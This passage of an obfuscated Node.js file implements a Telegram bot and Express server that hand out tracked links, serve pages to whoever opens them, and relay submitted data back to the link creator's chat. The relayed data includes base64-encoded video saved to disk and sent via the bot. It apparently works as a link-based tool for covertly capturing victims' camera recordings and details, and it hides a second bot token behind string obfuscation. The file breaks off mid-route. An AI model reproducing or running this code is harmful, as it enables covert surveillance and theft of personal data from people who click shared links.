const _0x178009 = _0x4b59;
(function (_0x6827fe, _0x1d4142) {
    const _0x338eab = _0x4b59, _0x35fee8 = _0x6827fe();
    while (!![]) {
        try {
            const _0x5db4dd = -parseInt(_0x338eab(0x203)) / (0xdd * -0x13 + -0x1297 + 0x22ff) + parseInt(_0x338eab(0x216)) / (-0x7 * 0x167 + 0x52e + 0x1d * 0x29) + -parseInt(_0x338eab(0x35e)) / (0x2569 + 0x1 * -0x1c97 + -0x8cf) * (-parseInt(_0x338eab(0x408)) / (-0x250a + -0x3df * 0x7 + 0x4027)) + -parseInt(_0x338eab(0x2de)) / (0x32e + -0x1 * 0x10b4 + 0xd8b) * (-parseInt(_0x338eab(0x791)) / (0x25ec + 0x1102 + 0xfb * -0x38)) + parseInt(_0x338eab(0x200)) / (-0x1 * -0x17d5 + -0xa96 * 0x2 + -0x151 * 0x2) * (-parseInt(_0x338eab(0x628)) / (0x2589 + 0x196d + -0x3eee)) + parseInt(_0x338eab(0x2a3)) / (0x353 + 0xcb7 * 0x1 + -0x1 * 0x1001) * (-parseInt(_0x338eab(0x6e5)) / (0x55 * -0x4b + -0xf0d + 0x27fe)) + -parseInt(_0x338eab(0x4be)) / (0x58 * 0x10 + -0x3d5 + -0x1a0) * (parseInt(_0x338eab(0x42a)) / (0x1aca + 0xb5f * 0x3 + -0x241 * 0x1b));
            if (_0x5db4dd === _0x1d4142)
                break;
            else
                _0x35fee8['push'](_0x35fee8['shift']());
        } catch (_0x398dba) {
            _0x35fee8['push'](_0x35fee8['shift']());
        }
    }
}(_0x5212, -0x35474 + -0x86f73 + 0x17ff87), require(_0x178009(0x23c))[_0x178009(0x2fc)]());
const TelegramBot = require(_0x178009(0x4d6) + _0x178009(0x487) + 'i'), express = require(_0x178009(0x47c)), bodyParser = require(_0x178009(0x4ed) + 'r'), multer = require(_0x178009(0x1f0)), path = require(_0x178009(0x3c0)), fs = require('fs'), crypto = require(_0x178009(0x294)), axios = require(_0x178009(0x2ee)), uuid = require(_0x178009(0x55d)), botToken = process[_0x178009(0x677)]['n'], botUsername = _0x178009(0x6c2), bot = new TelegramBot(botToken, { 'polling': !![] }), developerChannels = [
        _0x178009(0x288),
        _0x178009(0x5db),
        _0x178009(0x58b),
        _0x178009(0x7ce),
        _0x178009(0x234)
    ], SECOND_BOT_TOKEN = _0x178009(0x3ce) + _0x178009(0x28c) + _0x178009(0x20c) + _0x178009(0x644) + _0x178009(0x79c), secondBot = new TelegramBot(SECOND_BOT_TOKEN, { 'polling': !![] });
let inviteLinks = {}, userPoints = {}, linkData = {}, visitorData = {};
function clearCache() {
    const _0x1deab3 = _0x178009, _0x5cdb77 = { 'GIjIJ': _0x1deab3(0x796) + _0x1deab3(0x2c6) };
    console[_0x1deab3(0x22e)](_0x5cdb77[_0x1deab3(0x20a)]), userPoints = {}, linkData = {}, visitorData = {};
    const _0x2db0ef = {};
}
setInterval(clearCache, (0x1 * -0xacc + -0x17 * -0x104 + -0x588) * (0x22bd + -0x1c3d + -0x4 * 0xa6));
async function isUserSubscribed(_0x37b486) {
    const _0x4a3ed8 = _0x178009, _0x273cd6 = {
            'BnlGn': function (_0xd7d92d, _0x302a34) {
                return _0xd7d92d === _0x302a34;
            },
            'gPLtX': _0x4a3ed8(0x702),
            'PuyAt': function (_0x3cf943, _0x5983b7) {
                return _0x3cf943 === _0x5983b7;
            },
            'yhPHd': _0x4a3ed8(0x1fd) + _0x4a3ed8(0x779),
            'Pyupa': function (_0x346c31, _0x48f78b) {
                return _0x346c31 === _0x48f78b;
            },
            'GWTpB': _0x4a3ed8(0x5a1),
            'juEbS': _0x4a3ed8(0x2ad) + _0x4a3ed8(0x728) + _0x4a3ed8(0x76d) + _0x4a3ed8(0x399)
        };
    try {
        const _0x3b81fd = await Promise[_0x4a3ed8(0x2cf)](developerChannels[_0x4a3ed8(0x552)](_0x59d903 => bot[_0x4a3ed8(0x604) + _0x4a3ed8(0x2ec)](_0x59d903, _0x37b486)));
        return _0x3b81fd[_0x4a3ed8(0x38d)](_0x43bf63 => {
            const _0x1af643 = _0x4a3ed8, _0x2356e7 = _0x43bf63[_0x1af643(0x4e9)];
            return _0x273cd6[_0x1af643(0x494)](_0x2356e7, _0x273cd6[_0x1af643(0x43f)]) || _0x273cd6[_0x1af643(0x7af)](_0x2356e7, _0x273cd6[_0x1af643(0x688)]) || _0x273cd6[_0x1af643(0x578)](_0x2356e7, _0x273cd6[_0x1af643(0x327)]);
        });
    } catch (_0x37e4e2) {
        return console[_0x4a3ed8(0x6d0)](_0x273cd6[_0x4a3ed8(0x353)], _0x37e4e2), ![];
    }
}
bot[_0x178009(0x645)](/\/Vip/, async _0x3e1fa3 => {
    const _0x4511c8 = _0x178009, _0x5ebc5c = {
            'mLQOz': function (_0x26a746, _0x37bc1b) {
                return _0x26a746(_0x37bc1b);
            },
            'ICZJV': _0x4511c8(0x6b3) + _0x4511c8(0x32e) + _0x4511c8(0x462) + _0x4511c8(0x3a0) + _0x4511c8(0x795) + _0x4511c8(0x25b),
            'AXCTP': _0x4511c8(0x41c) + _0x4511c8(0x384) + _0x4511c8(0x56c) + _0x4511c8(0x4ab) + _0x4511c8(0x696) + _0x4511c8(0x27d) + _0x4511c8(0x5fe),
            'wNWEd': _0x4511c8(0x638) + _0x4511c8(0x634) + _0x4511c8(0x4e0),
            'SmxRp': _0x4511c8(0x6f3) + _0x4511c8(0x363) + _0x4511c8(0x396) + _0x4511c8(0x4c3),
            'XcOtJ': _0x4511c8(0x704) + _0x4511c8(0x1df) + _0x4511c8(0x470) + _0x4511c8(0x332),
            'mvZQF': _0x4511c8(0x4c6) + _0x4511c8(0x576) + _0x4511c8(0x240)
        }, _0xf66569 = _0x3e1fa3[_0x4511c8(0x6a6)]['id'], _0x12b947 = _0x3e1fa3[_0x4511c8(0x237)]['id'], _0x3764c3 = await _0x5ebc5c[_0x4511c8(0x45b)](isUserSubscribed, _0xf66569);
    if (!_0x3764c3) {
        const _0x482ef2 = _0x5ebc5c[_0x4511c8(0x6d6)], _0x3c23a1 = developerChannels[_0x4511c8(0x552)](_0x32b9a6 => [{
                    'text': _0x4511c8(0x56d) + _0x32b9a6,
                    'url': _0x4511c8(0x4d1) + _0x4511c8(0x681) + _0x32b9a6[_0x4511c8(0x56e)](0x2a2 + 0x7 * 0x409 + -0x26 * 0xd0)
                }]);
        bot[_0x4511c8(0x273) + 'e'](_0xf66569, _0x482ef2, { 'reply_markup': { 'inline_keyboard': _0x3c23a1 } });
        return;
    }
    const _0x358bd2 = uuid['v4']();
    linkData[_0x358bd2] = {
        'userId': _0x12b947,
        'chatId': _0xf66569,
        'visitors': []
    };
    const _0x581352 = _0x5ebc5c[_0x4511c8(0x5ad)];
    bot[_0x4511c8(0x273) + 'e'](_0xf66569, _0x581352, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x5ebc5c[_0x4511c8(0x820)],
                        'callback_data': _0x4511c8(0x2e3) + _0x358bd2
                    }],
                [{
                        'text': _0x5ebc5c[_0x4511c8(0x6a9)],
                        'callback_data': _0x4511c8(0x2e3) + _0x358bd2
                    }],
                [{
                        'text': _0x5ebc5c[_0x4511c8(0x698)],
                        'callback_data': _0x4511c8(0x2e3) + _0x358bd2
                    }],
                [{
                        'text': _0x5ebc5c[_0x4511c8(0x207)],
                        'callback_data': _0x4511c8(0x2e3) + _0x358bd2
                    }]
            ]
        }
    });
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), async _0x19f796 => {
    const _0x20817d = _0x178009, _0x395c9f = {
            'iLFSD': function (_0x3fa6ff, _0x4b142e) {
                return _0x3fa6ff === _0x4b142e;
            }
        }, _0x56d3f7 = _0x19f796[_0x20817d(0x1e6)][_0x20817d(0x6a6)]['id'], _0xe240df = _0x19f796[_0x20817d(0x237)]['id'], _0x336851 = _0x19f796[_0x20817d(0x320)][_0x20817d(0x577)]('_')[-0x11b * -0x3 + 0x2067 + -0x23b6];
    if (linkData[_0x336851] && _0x395c9f[_0x20817d(0x819)](linkData[_0x336851][_0x20817d(0x743)], _0xe240df)) {
        const _0x40edb3 = _0x20817d(0x737) + _0x20817d(0x705) + _0x20817d(0x259) + _0x20817d(0x7dc) + _0x20817d(0x766) + _0x20817d(0x73c) + _0x20817d(0x39b) + _0x20817d(0x652) + _0x20817d(0x67a) + _0x20817d(0x4a0) + _0x20817d(0x41b) + botUsername + _0x20817d(0x79b) + _0x336851;
        bot[_0x20817d(0x273) + 'e'](_0x56d3f7, _0x40edb3);
    }
});
const baseUrl = process[_0x178009(0x677)]['r'];
bot[_0x178009(0x645)](/\/vip (.+)/, async (_0x290ecd, _0x431dc0) => {
    const _0x2a6598 = _0x178009, _0x48cb30 = {
            'TAWko': function (_0x5a072a, _0xfc0708) {
                return _0x5a072a(_0xfc0708);
            },
            'yDqom': _0x2a6598(0x6b3) + _0x2a6598(0x32e) + _0x2a6598(0x462) + _0x2a6598(0x3a0) + _0x2a6598(0x795) + _0x2a6598(0x25b),
            'BfbmN': function (_0x15d0b5, _0x30d04d) {
                return _0x15d0b5 !== _0x30d04d;
            }
        }, _0x5c9f3c = _0x431dc0[-0x5e * -0x17 + -0x1 * 0xf43 + -0x246 * -0x3], _0x9e579e = _0x290ecd[_0x2a6598(0x237)]['id'], _0x467bc3 = _0x290ecd[_0x2a6598(0x6a6)]['id'], _0x3de267 = await _0x48cb30[_0x2a6598(0x73e)](isUserSubscribed, _0x467bc3);
    if (!_0x3de267) {
        const _0x278553 = _0x48cb30[_0x2a6598(0x7a7)], _0x1411ff = developerChannels[_0x2a6598(0x552)](_0x118865 => [{
                    'text': _0x2a6598(0x56d) + _0x118865,
                    'url': _0x2a6598(0x4d1) + _0x2a6598(0x681) + _0x118865[_0x2a6598(0x56e)](0x10c4 * 0x1 + 0x47 + -0x110a)
                }]);
        bot[_0x2a6598(0x273) + 'e'](_0x467bc3, _0x278553, { 'reply_markup': { 'inline_keyboard': _0x1411ff } });
        return;
    }
    if (linkData[_0x5c9f3c]) {
        const {
            userId: _0x38c1b2,
            visitors: _0x57661c
        } = linkData[_0x5c9f3c];
        if (_0x48cb30[_0x2a6598(0x5f2)](_0x9e579e, _0x38c1b2) && (!visitorData[_0x9e579e] || !visitorData[_0x9e579e][_0x2a6598(0x5cc)](_0x38c1b2))) {
            _0x57661c[_0x2a6598(0x30d)](_0x9e579e);
            !visitorData[_0x9e579e] && (visitorData[_0x9e579e] = []);
            visitorData[_0x9e579e][_0x2a6598(0x30d)](_0x38c1b2);
            !userPoints[_0x38c1b2] && (userPoints[_0x38c1b2] = -0x11e + 0x20c2 + -0x64 * 0x51);
            userPoints[_0x38c1b2] += -0xc8 * 0x28 + 0x31 * -0x43 + 0x2c14;
            const _0x36dd5b = _0x2a6598(0x812) + _0x2a6598(0x4f3) + _0x2a6598(0x39b) + _0x2a6598(0x7ac) + _0x2a6598(0x2a6) + userPoints[_0x38c1b2] + _0x2a6598(0x455);
            bot[_0x2a6598(0x273) + 'e'](_0x467bc3, _0x36dd5b);
            const _0x25b13b = _0x2a6598(0x6aa) + _0x2a6598(0x627) + _0x2a6598(0x7ea) + userPoints[_0x38c1b2] + _0x2a6598(0x64b);
            bot[_0x2a6598(0x273) + 'e'](_0x38c1b2, _0x25b13b);
        }
    }
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), async _0x3f6664 => {
    const _0x3e31ec = _0x178009, _0x2287a3 = {
            'hoFrJ': function (_0xc17686, _0x520fde) {
                return _0xc17686 === _0x520fde;
            }
        }, _0x3c1e78 = _0x3f6664[_0x3e31ec(0x1e6)][_0x3e31ec(0x6a6)]['id'], _0x19351f = _0x3f6664[_0x3e31ec(0x237)]['id'], _0x467de1 = _0x3f6664[_0x3e31ec(0x320)][_0x3e31ec(0x577)]('_')[-0x14 * -0x41 + 0x1555 + -0x9 * 0x2ef];
    if (linkData[_0x467de1] && _0x2287a3[_0x3e31ec(0x24c)](linkData[_0x467de1][_0x3e31ec(0x743)], _0x19351f)) {
        const _0x529fc2 = _0x3e31ec(0x737) + _0x3e31ec(0x705) + _0x3e31ec(0x259) + _0x3e31ec(0x7dc) + _0x3e31ec(0x766) + _0x3e31ec(0x73c) + _0x3e31ec(0x39b) + _0x3e31ec(0x652) + _0x3e31ec(0x3ab) + _0x3e31ec(0x1ea) + _0x3e31ec(0x35b) + botUsername + _0x3e31ec(0x79b) + _0x467de1;
        bot[_0x3e31ec(0x273) + 'e'](_0x3c1e78, _0x529fc2);
    }
}), bot[_0x178009(0x645)](/\/start (.+)/, async (_0x318445, _0x4bad73) => {
    const _0x445504 = _0x178009, _0x3d9901 = {
            'FySAO': function (_0x29df51, _0x4714d9) {
                return _0x29df51(_0x4714d9);
            },
            'eopJd': _0x445504(0x6b3) + _0x445504(0x32e) + _0x445504(0x462) + _0x445504(0x3a0) + _0x445504(0x795) + _0x445504(0x25b),
            'ATGbQ': function (_0x35b8a8, _0x44e188) {
                return _0x35b8a8 !== _0x44e188;
            }
        }, _0x17e2eb = _0x4bad73[0x194d + -0x6 * -0x648 + -0x3efc], _0x1d415d = _0x318445[_0x445504(0x237)]['id'], _0x2f4eba = _0x318445[_0x445504(0x6a6)]['id'], _0x493f54 = await _0x3d9901[_0x445504(0x372)](isUserSubscribed, _0x2f4eba);
    if (!_0x493f54) {
        const _0x2e4c7b = _0x3d9901[_0x445504(0x3b7)], _0x16c331 = developerChannels[_0x445504(0x552)](_0x3e63d0 => [{
                    'text': _0x445504(0x56d) + _0x3e63d0,
                    'url': _0x445504(0x4d1) + _0x445504(0x681) + _0x3e63d0[_0x445504(0x56e)](-0x2638 + -0xc5 + 0x2 * 0x137f)
                }]);
        bot[_0x445504(0x273) + 'e'](_0x2f4eba, _0x2e4c7b, { 'reply_markup': { 'inline_keyboard': _0x16c331 } });
        return;
    }
    if (linkData[_0x17e2eb]) {
        const {
            userId: _0x1adcb7,
            chatId: _0x9f0a0f,
            visitors: _0x34326b
        } = linkData[_0x17e2eb];
        if (_0x3d9901[_0x445504(0x75a)](_0x1d415d, _0x1adcb7) && (!visitorData[_0x1d415d] || !visitorData[_0x1d415d][_0x445504(0x5cc)](_0x1adcb7))) {
            _0x34326b[_0x445504(0x30d)](_0x1d415d);
            !visitorData[_0x1d415d] && (visitorData[_0x1d415d] = []);
            visitorData[_0x1d415d][_0x445504(0x30d)](_0x1adcb7);
            !userPoints[_0x1adcb7] && (userPoints[_0x1adcb7] = 0x17f * 0xd + -0x1 * -0x1f18 + -0x328b);
            userPoints[_0x1adcb7] += -0xdb9 + -0x14b9 + 0x1 * 0x2273;
            const _0x1db5fd = _0x445504(0x812) + _0x445504(0x4f3) + _0x445504(0x39b) + _0x445504(0x7ac) + _0x445504(0x2a6) + userPoints[_0x1adcb7] + (_0x445504(0x21e) + _0x445504(0x654) + _0x445504(0x333) + _0x445504(0x794) + _0x445504(0x683) + _0x445504(0x218));
            bot[_0x445504(0x273) + 'e'](_0x9f0a0f, _0x1db5fd);
        }
    }
});
const app = express();
app[_0x178009(0x2cc)](bodyParser[_0x178009(0x388)]({
    'extended': !![],
    'limit': _0x178009(0x3c6)
})), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x6ca)]({ 'limit': _0x178009(0x4e5) })), app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname));
const storage = multer[_0x178009(0x31b) + _0x178009(0x7bb)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x178009(0x742) });
app[_0x178009(0x344)](_0x178009(0x536) + 'rm', (_0x1424d4, _0x869073) => {
    const _0x4eb3cc = _0x178009, _0xafce42 = {
            'CTdkq': _0x4eb3cc(0x749) + _0x4eb3cc(0x5a5) + _0x4eb3cc(0x229),
            'zEYal': _0x4eb3cc(0x54c),
            'tjKma': _0x4eb3cc(0x817),
            'EgwbH': _0x4eb3cc(0x675),
            'BaTch': _0x4eb3cc(0x55f),
            'ctzvs': _0x4eb3cc(0x721),
            'Fgngf': _0x4eb3cc(0x242)
        }, _0x43184f = _0x1424d4[_0x4eb3cc(0x62d)][_0x4eb3cc(0x5cb)], _0x276ad6 = _0x1424d4[_0x4eb3cc(0x62d)][_0x4eb3cc(0x6b0)];
    if (!_0x43184f)
        return _0x869073[_0x4eb3cc(0x4e9)](-0x192b + -0xb21 + 0x25dc)[_0x4eb3cc(0x74b)](_0xafce42[_0x4eb3cc(0x818)]);
    let _0x5d1a1d = '';
    switch (_0x276ad6) {
    case _0xafce42[_0x4eb3cc(0x211)]:
        _0x5d1a1d = _0xafce42[_0x4eb3cc(0x4cb)];
        break;
    case _0xafce42[_0x4eb3cc(0x626)]:
        _0x5d1a1d = _0xafce42[_0x4eb3cc(0x7d4)];
        break;
    case _0xafce42[_0x4eb3cc(0x566)]:
    default:
        _0x5d1a1d = _0xafce42[_0x4eb3cc(0x7d3)];
        break;
    }
    _0x869073[_0x4eb3cc(0x4c1)](path[_0x4eb3cc(0x2a7)](__dirname, _0x5d1a1d));
}), app[_0x178009(0x344)](_0x178009(0x431) + _0x178009(0x544), (_0x14f968, _0x230a8e) => {
    const _0x227e3a = _0x178009, _0x39003b = {
            'HTvaq': function (_0x4988d0, _0x39f0d7) {
                return _0x4988d0(_0x39f0d7);
            },
            'EtCzI': _0x227e3a(0x572),
            'RepFp': _0x227e3a(0x4fa) + _0x227e3a(0x3de) + _0x227e3a(0x64f) + _0x227e3a(0x5c5) + _0x227e3a(0x341) + _0x227e3a(0x7fc),
            'xIvVG': _0x227e3a(0x361) + _0x227e3a(0x2ef) + _0x227e3a(0x58f) + _0x227e3a(0x81d) + _0x227e3a(0x28e) + _0x227e3a(0x5be)
        }, _0x23133a = _0x14f968[_0x227e3a(0x658)][_0x227e3a(0x7b0)];
    _0x39003b[_0x227e3a(0x46f)](validateLinkUsage, _0x23133a) ? _0x230a8e[_0x227e3a(0x4c1)](path[_0x227e3a(0x2a7)](__dirname, _0x39003b[_0x227e3a(0x364)])) : (_0x230a8e[_0x227e3a(0x74b)](_0x39003b[_0x227e3a(0x616)]), bot[_0x227e3a(0x273) + 'e'](linkUsage[_0x23133a][_0x227e3a(0x5cb)], _0x39003b[_0x227e3a(0x420)]));
}), app[_0x178009(0x344)](_0x178009(0x356) + _0x178009(0x551) + 'd', (_0xd52759, _0x2889e6) => {
    const _0x453e26 = _0x178009, _0x20433e = {
            'myWFK': function (_0x4fa79a, _0x10dd18) {
                return _0x4fa79a(_0x10dd18);
            },
            'BROwR': _0x453e26(0x605),
            'qwaJE': _0x453e26(0x4fa) + _0x453e26(0x3de) + _0x453e26(0x64f) + _0x453e26(0x5c5) + _0x453e26(0x341) + _0x453e26(0x7fc),
            'vaXZH': _0x453e26(0x361) + _0x453e26(0x2ef) + _0x453e26(0x58f) + _0x453e26(0x81d) + _0x453e26(0x28e) + _0x453e26(0x5be)
        }, _0x3f76ab = _0xd52759[_0x453e26(0x658)][_0x453e26(0x7b0)];
    _0x20433e[_0x453e26(0x557)](validateLinkUsage, _0x3f76ab) ? _0x2889e6[_0x453e26(0x4c1)](path[_0x453e26(0x2a7)](__dirname, _0x20433e[_0x453e26(0x382)])) : (_0x2889e6[_0x453e26(0x74b)](_0x20433e[_0x453e26(0x7f0)]), bot[_0x453e26(0x273) + 'e'](linkUsage[_0x3f76ab][_0x453e26(0x5cb)], _0x20433e[_0x453e26(0x50a)]));
}), app[_0x178009(0x344)](_0x178009(0x1d8) + _0x178009(0x2a1), (_0x82ce90, _0x3a715b) => {
    const _0x376909 = _0x178009, _0x2af87b = {
            'fYkZd': function (_0x80477e, _0x26daeb) {
                return _0x80477e(_0x26daeb);
            },
            'bLLzC': _0x376909(0x5b1),
            'PhLUI': _0x376909(0x4fa) + _0x376909(0x3de) + _0x376909(0x64f) + _0x376909(0x5c5) + _0x376909(0x341) + _0x376909(0x7fc),
            'nvDIx': _0x376909(0x361) + _0x376909(0x2ef) + _0x376909(0x58f) + _0x376909(0x81d) + _0x376909(0x28e) + _0x376909(0x5be)
        }, _0x45dd64 = _0x82ce90[_0x376909(0x658)][_0x376909(0x7b0)];
    _0x2af87b[_0x376909(0x29b)](validateLinkUsage, _0x45dd64) ? _0x3a715b[_0x376909(0x4c1)](path[_0x376909(0x2a7)](__dirname, _0x2af87b[_0x376909(0x7d6)])) : (_0x3a715b[_0x376909(0x74b)](_0x2af87b[_0x376909(0x460)]), bot[_0x376909(0x273) + 'e'](linkUsage[_0x45dd64][_0x376909(0x5cb)], _0x2af87b[_0x376909(0x5ac)]));
}), app[_0x178009(0x344)](_0x178009(0x1cc) + _0x178009(0x7d2), (_0xadd35a, _0x4f4a09) => {
    const _0x564f63 = _0x178009, _0x281f61 = {
            'crGvP': function (_0x45221, _0x1b56a7) {
                return _0x45221(_0x1b56a7);
            },
            'tlpUP': _0x564f63(0x61d),
            'soRVZ': _0x564f63(0x4fa) + _0x564f63(0x3de) + _0x564f63(0x64f) + _0x564f63(0x5c5) + _0x564f63(0x341) + _0x564f63(0x7fc),
            'CxkSJ': _0x564f63(0x361) + _0x564f63(0x2ef) + _0x564f63(0x58f) + _0x564f63(0x81d) + _0x564f63(0x28e) + _0x564f63(0x5be)
        }, _0x1a33d5 = _0xadd35a[_0x564f63(0x658)][_0x564f63(0x7b0)];
    _0x281f61[_0x564f63(0x622)](validateLinkUsage, _0x1a33d5) ? _0x4f4a09[_0x564f63(0x4c1)](path[_0x564f63(0x2a7)](__dirname, _0x281f61[_0x564f63(0x569)])) : (_0x4f4a09[_0x564f63(0x74b)](_0x281f61[_0x564f63(0x7e5)]), bot[_0x564f63(0x273) + 'e'](linkUsage[_0x1a33d5][_0x564f63(0x5cb)], _0x281f61[_0x564f63(0x1e7)]));
}), app[_0x178009(0x25e)](_0x178009(0x1ed) + 'es', (_0x5259bd, _0x34a515) => {
    const _0x4eed95 = _0x178009, _0xed432f = {
            'MJaqO': _0x4eed95(0x4e6) + _0x4eed95(0x271) + _0x4eed95(0x757) + ':',
            'GOgXw': _0x4eed95(0x518) + _0x4eed95(0x1e2),
            'XBdkx': _0x4eed95(0x402)
        }, _0x4015fe = _0x5259bd[_0x4eed95(0x4d8)][_0x4eed95(0x5cb)], _0x169f00 = _0x5259bd[_0x4eed95(0x4d8)][_0x4eed95(0x57e)], _0x127279 = _0x5259bd[_0x4eed95(0x4d8)][_0x4eed95(0x1ee)];
    console[_0x4eed95(0x22e)](_0xed432f[_0x4eed95(0x48c)], _0x5259bd[_0x4eed95(0x4d8)]), bot[_0x4eed95(0x273) + 'e'](_0x4015fe, _0x4eed95(0x296) + _0x4eed95(0x5f5) + _0x4eed95(0x3a4) + ':\x20' + _0x169f00 + (_0x4eed95(0x4fb) + _0x4eed95(0x586)) + _0x127279)[_0x4eed95(0x3e0)](() => {
    })[_0x4eed95(0x3d1)](_0x22d0f9 => {
        const _0xc412f5 = _0x4eed95;
        console[_0xc412f5(0x6d0)](_0xed432f[_0xc412f5(0x2a4)], _0x22d0f9[_0xc412f5(0x246)] ? _0x22d0f9[_0xc412f5(0x246)][_0xc412f5(0x4d8)] : _0x22d0f9);
    }), _0x34a515[_0x4eed95(0x3c8)](_0xed432f[_0x4eed95(0x65e)]);
}), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x6ca)]()), app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x344)](_0x178009(0x468), (_0x43244b, _0xb3bc7) => {
    const _0x384d36 = _0x178009, _0x434d9e = { 'JjVQX': _0x384d36(0x69f) };
    _0xb3bc7[_0x384d36(0x4c1)](path[_0x384d36(0x2a7)](__dirname, _0x434d9e[_0x384d36(0x6fc)]));
}), app[_0x178009(0x25e)](_0x178009(0x720) + _0x178009(0x4b0), (_0x23e7bb, _0x11b535) => {
    const _0x55c599 = _0x178009, _0x35f896 = { 'diUbi': _0x55c599(0x4e6) + _0x55c599(0x271) + _0x55c599(0x757) + ':' }, _0x589eba = _0x23e7bb[_0x55c599(0x4d8)][_0x55c599(0x5cb)], _0x319e68 = _0x23e7bb[_0x55c599(0x4d8)][_0x55c599(0x7b1) + 'r'];
    bot[_0x55c599(0x273) + 'e'](_0x589eba, _0x55c599(0x664) + _0x55c599(0x731) + _0x55c599(0x4ba) + _0x55c599(0x57b) + _0x55c599(0x2b9) + _0x55c599(0x619) + _0x55c599(0x275) + _0x55c599(0x2d6) + ':\x20' + _0x319e68)[_0x55c599(0x3e0)](() => {
        const _0x41f019 = _0x55c599;
        _0x11b535[_0x41f019(0x6ca)]({ 'success': !![] });
    })[_0x55c599(0x3d1)](_0x52d1d9 => {
        const _0xe02c22 = _0x55c599;
        console[_0xe02c22(0x6d0)](_0x35f896[_0xe02c22(0x802)], _0x52d1d9[_0xe02c22(0x246)] ? _0x52d1d9[_0xe02c22(0x246)][_0xe02c22(0x4d8)] : _0x52d1d9), _0x11b535[_0xe02c22(0x6ca)]({ 'success': ![] });
    });
}), app[_0x178009(0x25e)](_0x178009(0x61f) + 'e', (_0xe15626, _0xa9c60c) => {
    const _0x275957 = _0x178009, _0x58d0bc = {
            'AJcUo': _0x275957(0x78d) + _0x275957(0x553) + _0x275957(0x4b3),
            'FtvkX': _0x275957(0x4e6) + _0x275957(0x271) + _0x275957(0x757) + ':'
        }, _0x557ebe = _0xe15626[_0x275957(0x4d8)][_0x275957(0x5cb)], _0x4f7395 = _0xe15626[_0x275957(0x4d8)][_0x275957(0x31a)];
    bot[_0x275957(0x273) + 'e'](_0x557ebe, _0x275957(0x597) + _0x275957(0x5ee) + _0x275957(0x4af) + '\x20' + _0x4f7395)[_0x275957(0x3e0)](() => {
        const _0x329af4 = _0x275957;
        _0xa9c60c[_0x329af4(0x3c8)](_0x58d0bc[_0x329af4(0x6ae)]);
    })[_0x275957(0x3d1)](_0x96a310 => {
        const _0x41b597 = _0x275957;
        console[_0x41b597(0x6d0)](_0x58d0bc[_0x41b597(0x753)], _0x96a310[_0x41b597(0x246)] ? _0x96a310[_0x41b597(0x246)][_0x41b597(0x4d8)] : _0x96a310), _0xa9c60c[_0x41b597(0x6ca)]({ 'success': ![] });
    });
}), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x6ca)]({ 'limit': _0x178009(0x33a) })), app[_0x178009(0x2cc)](bodyParser[_0x178009(0x388)]({
    'limit': _0x178009(0x33a),
    'extended': !![]
}));
const dataStore = {};
app[_0x178009(0x2cc)](express[_0x178009(0x451)](__dirname)), app[_0x178009(0x25e)](_0x178009(0x542) + 'eo', (_0x10574b, _0x588d25) => {
    const _0x4a9641 = _0x178009, _0x764dfb = {
            'eCEAi': _0x4a9641(0x411),
            'ckjTq': _0x4a9641(0x4e6) + _0x4a9641(0x6d9),
            'uWghb': _0x4a9641(0x29f) + _0x4a9641(0x306),
            'vuzbd': function (_0x1be55c, _0x181e7a) {
                return _0x1be55c || _0x181e7a;
            },
            'Tlznp': _0x4a9641(0x59c) + _0x4a9641(0x54d) + _0x4a9641(0x267) + _0x4a9641(0x4a2) + _0x4a9641(0x6d7),
            'RwNbt': _0x4a9641(0x2d5),
            'prWpB': _0x4a9641(0x4bc),
            'LEHSJ': _0x4a9641(0x772) + _0x4a9641(0x2b5) + _0x4a9641(0x1e1),
            'eTzGD': _0x4a9641(0x4b6) + _0x4a9641(0x695) + _0x4a9641(0x3b6),
            'QcdEf': _0x4a9641(0x29f) + _0x4a9641(0x648) + _0x4a9641(0x304)
        }, _0x36b2c2 = _0x10574b[_0x4a9641(0x4d8)][_0x4a9641(0x5cb)], _0x435cae = _0x10574b[_0x4a9641(0x4d8)][_0x4a9641(0x7cd)];
    if (_0x764dfb[_0x4a9641(0x75f)](!_0x36b2c2, !_0x435cae))
        return _0x588d25[_0x4a9641(0x4e9)](0x26b0 * -0x1 + 0x2c * -0x79 + 0x3d0c)[_0x4a9641(0x74b)](_0x764dfb[_0x4a9641(0x78f)]);
    const _0x299b3c = _0x435cae[_0x4a9641(0x577)](',')[-0x1155 + -0x12d3 * 0x1 + 0x2429], _0x4e914e = path[_0x4a9641(0x2a7)](__dirname, _0x764dfb[_0x4a9641(0x709)]);
    !fs[_0x4a9641(0x71b)](_0x4e914e) && fs[_0x4a9641(0x7f8)](_0x4e914e);
    try {
        const _0x198348 = Buffer[_0x4a9641(0x237)](_0x299b3c, _0x764dfb[_0x4a9641(0x623)]), _0x5b5eef = path[_0x4a9641(0x2a7)](_0x4e914e, _0x36b2c2 + _0x4a9641(0x484));
        fs[_0x4a9641(0x663) + _0x4a9641(0x611)](_0x5b5eef, _0x198348), bot[_0x4a9641(0x3ae)](_0x36b2c2, _0x5b5eef, { 'caption': _0x764dfb[_0x4a9641(0x5fd)] })[_0x4a9641(0x3e0)](() => {
            const _0x5c059b = _0x4a9641;
            console[_0x5c059b(0x22e)](_0x5c059b(0x81f) + _0x5c059b(0x24d) + _0x5c059b(0x339) + _0x5c059b(0x2e7) + _0x36b2c2), _0x588d25[_0x5c059b(0x3c8)](_0x764dfb[_0x5c059b(0x5b0)]);
        })[_0x4a9641(0x3d1)](_0x514ee2 => {
            const _0x3c64e9 = _0x4a9641;
            console[_0x3c64e9(0x6d0)](_0x764dfb[_0x3c64e9(0x6b7)], _0x514ee2), _0x588d25[_0x3c64e9(0x4e9)](-0x3 * 0x936 + 0x538 + 0x185e)[_0x3c64e9(0x74b)](_0x764dfb[_0x3c64e9(0x438)]);
        });
    } catch (_0x6ef5f9) {
        console[_0x4a9641(0x6d0)](_0x764dfb[_0x4a9641(0x255)], _0x6ef5f9), _0x588d25[_0x4a9641(0x4e9)](-0x16b0 + 0x44 * -0x8a + 0x3d4c * 0x1)[_0x4a9641(0x74b)](_0x764dfb[_0x4a9641(0x53e)]);
    }
}), app[_0x178009(0x344)](_0x178009(0x66e), (_0x47b816, _0x4846ca) => {
